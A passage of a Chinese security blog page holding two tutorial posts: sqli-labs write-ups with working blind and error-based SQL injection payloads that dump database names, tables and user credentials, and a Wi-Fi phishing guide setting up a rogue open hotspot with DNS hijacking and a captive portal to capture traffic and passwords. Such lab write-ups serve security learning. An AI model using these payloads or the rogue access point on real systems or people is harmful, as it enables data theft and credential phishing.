<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-3/3-3.jpg" alt="3-3"></p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>mysql写shell，需要的条件是数据库需要开启secure-file-priv文件写入权限，sql执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;</span><br><span class="line">当secure_file_priv没写，就可以读取磁盘的目录。</span><br><span class="line">当secure_file_priv为G:\，就可以读取G盘的文件。</span><br><span class="line">当secure_file_priv为NULL，load_file就不能加载文件。</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-3/3-4.jpg" alt="3-4"></p>
<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><p>单引号报错，配合and 1=1 1=2 猜测出sql语句仅仅被单引号包裹，试试布尔盲注：</p>
<p>构造语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id =1&#x27; and length(database()) = 8 <span class="comment">-- -    //判断长度</span></span><br><span class="line">?id =1&#x27; and left (<span class="keyword">select</span> <span class="keyword">database</span>(),<span class="number">1</span>) = <span class="string">&#x27;s&#x27;</span>  //第一位的字符</span><br></pre></td></tr></table></figure>

<h1 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h1><p>基于单引号的时间盲注，页面没有变化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1&#39; and sleep(5) -- - </span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&#x3D;8 , sleep(3), 1) --+. &#x2F;&#x2F;有长度为8</span><br><span class="line">?id&#x3D;1&#39; and if (left (select database(),1) &#x3D; &#39;s&#39; , sleep(5) ,1) -- - &#x2F;&#x2F;第一位为s则睡眠5秒</span><br></pre></td></tr></table></figure>

<h1 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h1><p>基于双引号的时间盲注，页面没有变化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1&quot; and sleep(5) -- - </span><br><span class="line">?id&#x3D;1&quot; and if(length(database())&#x3D;8 , sleep(3), 1) --+. &#x2F;&#x2F;有长度为8</span><br><span class="line">?id&#x3D;1&quot; and if (left (select database(),1) &#x3D; &#39;s&#39; , sleep(5) ,1) -- - &#x2F;&#x2F;第一位为s则睡眠5秒</span><br></pre></td></tr></table></figure>



      
      
    </div>
    
    <footer class="article-footer">
      
        <a data-url="http://likesoso.github.io/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-3/" data-id="ckg3edy0h000f7es63ir09czy" class="article-share-link">Share</a>
      

      
        <a href="http://likesoso.github.io/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-3/#disqus_thread" class="article-comment-link">评论</a>
      

      
    </footer>
  </div>
  
</article>


  
    <article id="post-sqli-labs教程-2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/" class="article-date">
  <time datetime="2020-09-07T05:40:12.000Z" itemprop="datePublished">2020-09-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/sqli/">sqli</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/">sqli-labs教程(2)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><p>单引号报错：</p>
<blockquote>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
</blockquote>
<p>判断是只有单引号包裹id，尝试构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 &#39; and 1&#x3D;1 -- - &#x2F;&#x2F;页面正常</span><br><span class="line">?id&#x3D;1 &#39; and 1&#x3D;2 -- - &#x2F;&#x2F;页面不正常</span><br></pre></td></tr></table></figure>

<p>order by 后得到是3个字段，尝试union select 和报错注入时，发现没有回显位，可供回显</p>
<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-1.jpg" alt="2-1.jpg"></p>
<h2 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h2><p><code>?id=1&#39; and sleep(5) -- -</code></p>
<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-2.jpg" alt="2-2.jpg"></p>
<p>时间盲注和报错注入的payload构造基本相似：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if (SQL语句,sleep(5),1) <span class="comment">-- -</span></span><br><span class="line">//if(expr1,expr2,expr3) expr1为ture 返回expr2 否则返回expr3</span><br></pre></td></tr></table></figure>

<p>爆库名长度：<br><code>?id = 1&#39; and if (length(database()) = 8,sleep(5),1) -- -</code></p>
<p>如果sleep(5)执行了，表明数据库名长度为8位</p>
<p>爆库名payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id =1&#x27; and if (left(database(),1) = &#x27;s&#x27; ,sleep(5),1) <span class="comment">-- -</span></span><br><span class="line">//left(database(),1) 返回database()从左往右的第一位，即为s</span><br></pre></td></tr></table></figure>
<p>一个字符一个字符的爆破最终得到数据库名为<strong>security</strong></p>
<p>以此类推爆破表，列，需要注意的是mysql对大小写不敏感，所以爆破出得结果可能与真实结果有偏差</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>正确会页面正常，错误页面不正常</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id =1&#x27; and left((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>) = <span class="string">&#x27;s&#x27;</span> <span class="comment">-- -`</span></span><br><span class="line">//一个字符一个字符的跑，用二分法</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="这里介绍一种利用count-聚合函数构造双查询注入"><a href="#这里介绍一种利用count-聚合函数构造双查询注入" class="headerlink" title="这里介绍一种利用count(*)聚合函数构造双查询注入"></a>这里介绍一种利用count(*)聚合函数构造双查询注入</h2><p>首先了解四个函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. Rand()  &#x2F;&#x2F;随机函数，0&lt;值&lt;1</span><br><span class="line">2. Floor()  &#x2F;&#x2F;取整函数,向下取整</span><br><span class="line">3. Count() &#x2F;&#x2F;汇总函数，计数</span><br><span class="line">4. Group by clause &#x2F;&#x2F;分组语句</span><br></pre></td></tr></table></figure>

<p>故FLOOR(RAND()*2)的值只能是0或者1</p>
<p>执行以下sql语句：<br><code>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2))</code></p>
<p>concat会将数据库名和0或者1拼接起来，所以返回值为security0或者security1</p>
<p>执行：<br><code>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) from information_schema.schemata</code></p>
<p>数据库中<strong>information_schema.schemata</strong>包含了所有的数据库名。本地有7个数据库所以返回了7个结果：</p>
<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-3.jpg" alt="2-1.jpg"></p>
<p>给CONCAT((SELECT database()), FLOOR(RAND()*2))设置一个别名为a，然后分组，可以得到两组：security0和security1:</p>
<p><code>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2))as a from information_schema.schemata group by a</code></p>
<p><strong>最后</strong>，配合聚合函数count(*)，构造sql语句：</p>
<p><code>SELECT count(*), CONCAT((SELECT database()), FLOOR(RAND()*2))as a from information_schema.schemata group by a</code></p>
<p><strong>会产生报错！！</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &#39;security1&#39; for key ‘group_key’</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-4.jpg" alt="2-4.jpg"></p>
<p>到这里，就是利用聚合函数count(*)构造双查询报错注入的最终方法了。结合less5，构造一下payload：</p>
<p>爆库名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">count</span>(*),<span class="keyword">CONCAT</span>(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">SELECT</span> <span class="keyword">database</span>()),<span class="string">&#x27;~&#x27;</span>, <span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select count(*),1,CONCAT(&#x27;</span>~<span class="string">&#x27;,(SELECT database()),&#x27;</span>~<span class="string">&#x27;, FLOOR(RAND()*2))as a from information_schema.tables group by a -- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//这里写两个conut(*)是因为会报错 ：The used SELECT statements have a different number of columns，所以加一个count(*)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>结果有时候会显示不出来，再次发包即可</p>
<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-5.jpg" alt="2-5.jpg"></p>
<p>爆表名：</p>
<p><code>-1&#39; union select count(*),1,CONCAT(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#39;~&#39;, FLOOR(RAND()*2))as a from information_schema.tables group by a -- -</code></p>
<p>通过修改limit0,1 为limit 1,1 可以读取下一条数据，以此类推读取到用户表user</p>
<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-6.jpg" alt="2-6.jpg"></p>
<p>爆列名<br><code>?id=-1&#39; union select count(*),1,CONCAT(&#39;~&#39;,(select concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1),&#39;~&#39;, FLOOR(RAND()*2))as a from information_schema.tables group by a -- - </code></p>
<p>通过修改limit0,1 为limit 1,1 可以读取下一条数据，以此类推读取到字段：username、password</p>
<p>爆内容：</p>
<p><code>-1&#39; union select count(*),1,CONCAT(&#39;~&#39;,(select concat(username,&#39;|&#39;,password) from users limit 0,1),&#39;~&#39;, FLOOR(RAND()*2))as a from information_schema.tables group by a -- -</code></p>
<p>修改limit，读取剩下的数据：</p>
<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-7.jpg" alt="2-7.jpg"></p>
<h2 id="用DNS带出无回显的注入结果"><a href="#用DNS带出无回显的注入结果" class="headerlink" title="用DNS带出无回显的注入结果"></a>用DNS带出无回显的注入结果</h2><p><a href="www.0xby.com/916.html">详情点击此处</a></p>
<p>这种方法只能在<strong>windows</strong>的服务器下使用，由于UNC路径为<code>\\servername\filename</code><br>所以当我们访问<code>\\xxxxx.com\1.txt</code> 需要构造<code>\\\\xxxx.com\\1.txt</code> 四个反斜杠的原因是因为将反斜杠做转义，不然两个\会被转义为一个，导致语句报错。</p>
<h1 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h1><p>单引号不报错，双引号报错：</p>
<blockquote>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” LIMIT 0,1’ at line 1</p>
</blockquote>
<p>判断$id被双引号包裹，其他跟less5一致，只需要将less5的payload中的’替换成”即可</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>


      
      
    </div>
    
    <footer class="article-footer">
      
        <a data-url="http://likesoso.github.io/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/" data-id="ckg3edy0g000d7es65ccdatcx" class="article-share-link">Share</a>
      

      
        <a href="http://likesoso.github.io/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/#disqus_thread" class="article-comment-link">评论</a>
      

      
    </footer>
  </div>
  
</article>


  
    <article id="post-近源渗透-4" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/03/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F-4/" class="article-date">
  <time datetime="2020-09-03T09:28:22.000Z" itemprop="datePublished">2020-09-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/wifi/">wifi</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/03/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F-4/">近源渗透(4)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <p>&nbsp;&nbsp;&nbsp;&nbsp;到这一章，我们的基础学习就已经结束了，学到了一些802.11的原理知识,以及kali下的基础操作。接下来进入正题。不难发现之前的操作，只能做一些拒绝服务攻击，或者是靠字典的强大，爆破出wifi密码，从而连接到目标网络内。接下来记录一下我的wifi钓鱼学习笔记。</p>
<h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>一个支持AP模式的无线网卡，这里我推荐TP-LINK的TL-WN722N Ver1.0，咸鱼30rmb购得。推荐ver1版本的，ver2的kali没得自带的驱动。</p>
<p><img src="/2020/09/03/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F-4/4-1.jpg" alt="4-1.jpg"></p>
<p><strong>安装hostapd、dnsmasq、php等</strong></p>
<h3 id="hostpad"><a href="#hostpad" class="headerlink" title="hostpad"></a>hostpad</h3><p>实现了热点的建立，管理等功能</p>
<p>首先创建一个open.conf作为热点的配置文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">interface&#x3D;wlan0</span><br><span class="line">ssid&#x3D;FreeWIFI</span><br><span class="line">driver&#x3D;nl80211</span><br><span class="line">channel&#x3D;1</span><br><span class="line">hw_mode&#x3D;g</span><br></pre></td></tr></table></figure>
<h3 id="dnsmasq"><a href="#dnsmasq" class="headerlink" title="dnsmasq"></a>dnsmasq</h3><p>提供DNS和DHCP服务的简易轻量级配置工具</p>
<p>向/etc/dnsmasq.conf添加一条：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dhcp-range&#x3D;172.5.5.100, 172.5.5.250, 12h</span><br><span class="line">interface&#x3D;wlan0</span><br></pre></td></tr></table></figure>

<p>重启服务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart dnsmasq</span><br></pre></td></tr></table></figure>

<p>运行以下命令，消除系统对网卡的影响</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmcli radio wifi off #表示关闭wifi</span><br><span class="line">rfkill unblock wlan #解锁无线网卡</span><br><span class="line">ifconfig wlan0 172.5.5.1&#x2F;24</span><br><span class="line">hostapd open.conf #开启wifi</span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<p><img src="/2020/09/03/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F-4/4-2.jpg" alt="4-2.jpg"></p>
<p>此时SSID为Freewifi的无密码wifi已经开启，但是这个wifi不能上网，我们还需要将wlan0转发到能出网的eth0上面</p>
<p>运行<code>ifconfig</code>查看外网网卡为eth0</p>
<p><img src="/2020/09/03/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F-4/4-3.jpg" alt="4-3.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1</span><br></pre></td></tr></table></figure>
<p>开启ip路由转发功能，这个是临时配置，修改/etc/systcl.conf 可以永久更改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -I POSTROUTING -o eth0 -j MASQUERADE #转发</span><br></pre></td></tr></table></figure>

<p>这时钓鱼wifi已经可以连接到互联网了，用wireshark等抓包工具对eth0进行抓包。即可抓到连接wifi的客户端的所有流量。</p>
<h2 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h2><p>简单的图片捕获工具</p>
<p>kali安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install driftnet</span><br><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
<p>经过测试，成功率不是很高。很多图片都抓不到</p>
<h2 id="DNS-劫持"><a href="#DNS-劫持" class="headerlink" title="DNS 劫持"></a>DNS 劫持</h2><p>在本地部署钓鱼网站，无线客户端连接网络时，通过DHCP服务不仅能获得本地的ip地址，还包括DHCP服务指定的DNS解析地址。</p>
<p>先在本地搭建钓鱼网站，以flash为例子：</p>
<p>通过对DNS服务器进行配置，打开/etc/dnsmasq.conf，添加格式：address=/url/ip</p>
<p>添加一条：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">address&#x3D;&#x2F;#&#x2F;172.5.5.1</span><br><span class="line">#在url处填#，将解析所有的地址</span><br></pre></td></tr></table></figure>
<p>重启dnsmasq即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart dnsmasq</span><br></pre></td></tr></table></figure>

<p>之后连接上wifi之后就可以完成劫持了</p>
<h2 id="配置Captive-Protal"><a href="#配置Captive-Protal" class="headerlink" title="配置Captive Protal"></a>配置Captive Protal</h2><p>连接上免费的wifi后，要求认证。以此方式欺骗得到账号密码。</p>
<p>以android设备为例子，当设备接入无线网络时，会尝试请求访问client3.google.com/generate_204并根据返回结果来判断网络状况，返回204则表示网络正常，<strong>返回302则表示存在认证</strong>，并以弹窗的方式显示在手机中。</p>
<p><strong>1.配置iptables</strong></p>
<p>将所有的流量包丢弃，但是允许DNS查询，及向网关特定端口请求（172.5.5.1的80端口）；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -i wlan0 -p tcp --dport 53 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i wlan0 -p udp --dport 53 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i wlan0 -p tcp --dport 80 -d 172.5.5.1 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i wlan0 -j DROP</span><br></pre></td></tr></table></figure>
<p>将来自nat网络对80端口的请求全部转发到172.5.5.1:80</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 172.5.5.1:80</span><br></pre></td></tr></table></figure>
<p>来自nat的dns请求都转发到172.5.5.1的53端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to-destination 172.5.5.1:53</span><br><span class="line">iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to-destination 172.5.5.1:53</span><br></pre></td></tr></table></figure>
<p>以上配置后，android连接到FreeWifi后，请求client3.google.com/generate_204，会被转发到172.5.5.1:80</p>
<p><strong>安装php7.4-fpm</strong><br>执行安装命令并启动服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install php7.4-fpm</span><br><span class="line">systemctl start pap7.4-fpm</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p><strong>配置nginx</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        root &#x2F;var&#x2F;www&#x2F;html;  &#x2F;&#x2F;网站根目录</span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">                if (!-e $request_filename) &#123;</span><br><span class="line">                         rewrite ^&#x2F;(.*)$ &#x2F;index.html redirect;  &#x2F;&#x2F;访问不存在的页面会302到主页面</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        location ~ \.php$ &#123;		&#x2F;&#x2F;支持php</span><br><span class="line">                include snippets&#x2F;fastcgi-php.conf;</span><br><span class="line">                fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.4-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时连接上wifi，会自动弹出认证界面。接下来就是自己搭建钓鱼页面然后去试试了。<br><img src="/2020/09/03/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F-4/4-4.jpg" alt="4-4.jpg"></p>

      
      
    </div>
    
    <footer class="article-footer">
      
        <a data-url="http://likesoso.github.io/2020/09/03/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F-4/" data-id="ckg3edy0v00157es61j7khno8" class="article-share-link">Share</a>
      

      
        <a href="http://likesoso.github.io/2020/09/03/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F-4/#disqus_thread" class="article-comment-link">评论</a>
      

      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页 &amp;raquo;</a>
  </nav>

</section>
      
      <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title">about</h3>
  <div class="widget">
    <ul>
      
      
        
        
          <div style="text-align: center;">
            <img src="/img/tuitui.jpg" style="width: 100%; max-width: 250px;">
          </div>
        
        <li>
          <a href="/img/tuitui.jpg" target="_blank">1. my cat</a>
        </li>
      
        
        
        <li>
          <a href="https://github.com/likesoso" target="_blank">2. 我的「github」</a>
        </li>
      
    </ul>
  </div>
</div>
  
    <div class="widget-wrap">
  <h3 class="widget-title">推荐文章</h3>
  <div class="widget">
    <ul>
      
      
        
        <li>
          <a href="/2020/09/03/近源渗透-1/" target="_blank">1. 近源渗透1</a>
        </li>
      
        
        <li>
          <a href="/2020/09/03/近源渗透-2/" target="_blank">2. 近源渗透2</a>
        </li>
      
        
        <li>
          <a href="/2020/09/03/近源渗透-3/" target="_blank">3. 近源渗透3</a>
        </li>
      
        
        <li>
          <a href="/2020/09/03/近源渗透-4/" target="_blank">4. 近源渗透4</a>
        </li>
      
    </ul>
  </div>
</div>
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Misc/">Misc</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/games/">games</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/mail/">mail</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/sqli/">sqli</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/src/">src</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/wifi/">wifi</a><span class="category-list-count">4</span></li></ul>
    </div>
  </div>

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">2020年 10月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">2020年 09月</a><span class="archive-list-count">13</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最近评论</h3>
    <div class="widget">
      <!-- 多说最新评论 start -->
      <div class="ds-recent-comments" data-num-items="5" data-show-avatars="0" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="70"></div>
      <!-- 多说最新评论 end -->
      <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
      <script type="text/javascript">
        var duoshuoQuery = {short_name:"shijiajie"};
        (function() {
          var ds = document.createElement('script');
          ds.type = 'text/javascript';ds.async = true;
          ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
          ds.charset = 'UTF-8';
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
        })();
      </script>
      <!-- 多说公共JS代码 end -->
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
  </script>
  
  <div class="outer">
    <div id="footer-info" class="inner">
      Copyright &copy; 2012 - 2020 <a href="/" target="_blank">likesoso</a>.
      &nbsp;
      <span id="busuanzi_container_site_pv">
        总访问量 <a href="http://service.ibruce.info/" target="_blank"><span id="busuanzi_value_site_pv"></span></a> 次
      </span>
      <span id="busuanzi_container_site_uv">
        <a href="http://service.ibruce.info/" target="_blank"><span id="busuanzi_value_site_uv"></span></a> 人.
      </span>
      
    </div>
  </div>
</footer>

  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/archives" class="mobile-nav-link">文章</a>
  
    <a href="/about" class="mobile-nav-link">关于</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="返回顶部"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<script>
  var disqus_shortname = 'likesoso';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
</body>
</html>
